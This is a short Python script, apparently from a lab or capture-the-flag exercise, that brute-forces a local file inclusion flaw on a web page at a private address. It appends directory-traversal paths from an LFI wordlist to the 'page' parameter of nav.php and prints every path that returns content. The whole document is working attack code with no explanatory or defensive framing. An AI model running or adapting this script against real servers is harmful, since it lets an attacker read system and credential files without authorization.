# Check all combinaison http://172.16.1.10/nav.php?page=blog.html

import requests

url = "http://172.16.1.10/nav.php?page=../../../../.."

wordlist = open("wordlist/lfi.txt", "r")

for line in wordlist:
    line = line.rstrip()

    try:
        r = requests.get(url + line)
        content_length = int(r.headers['Content-Length'])
        if (r.status_code == 200 or r.status_code == 301) and content_length != 0:
            print(line)
    except:
        pass

wordlist.close()
